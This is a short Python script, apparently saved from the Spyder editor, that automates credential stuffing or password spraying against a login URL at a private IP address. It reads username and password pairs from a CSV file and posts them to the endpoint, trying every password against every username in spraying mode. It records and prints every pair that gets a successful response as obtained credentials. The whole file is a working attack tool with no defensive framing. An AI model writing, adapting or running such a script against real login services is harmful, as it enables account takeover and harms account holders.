# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""

import requests
import csv

URL = 'http://172.29.179.176:3004/users/login'
attack_method=int(input("Enter 1 for credential stuffing, 2 for password spraying: \n" ))

username_list = []
password_list = []
response = []
credentials = []
if(attack_method == 1):
    with open('credentials - Sheet1.csv') as csv_file:
        readCSV = csv.reader(csv_file, delimiter=',')
        for row in readCSV:
            PARAMS = {'username':row[0], 'password': row[1]}
            print (PARAMS)
            r = requests.post(url=URL, data=PARAMS)
            if(r.status_code==200):
                print (PARAMS)
                print (r.json())
                credentials.append(PARAMS)
                response.append(r.json())
elif(attack_method==2):
    
    with open('credentials - Sheet1.csv') as csv_file:
        readCSV = csv.reader(csv_file, delimiter=',')
        for row in readCSV:
            username_list.append(row[0])
            password_list.append(row[1])
    
    for i in password_list:
        for j in username_list:
            PARAMS = {'username':j, 'password': i}
            print(PARAMS)
            r = requests.post(url=URL, data=PARAMS)
            if(r.status_code==200):
                print (PARAMS)
                print (r.json())
                credentials.append(PARAMS)
                response.append(r.json())
else:
    print("Choice not found")
    
print("Crendetials Obtained: \n",credentials)







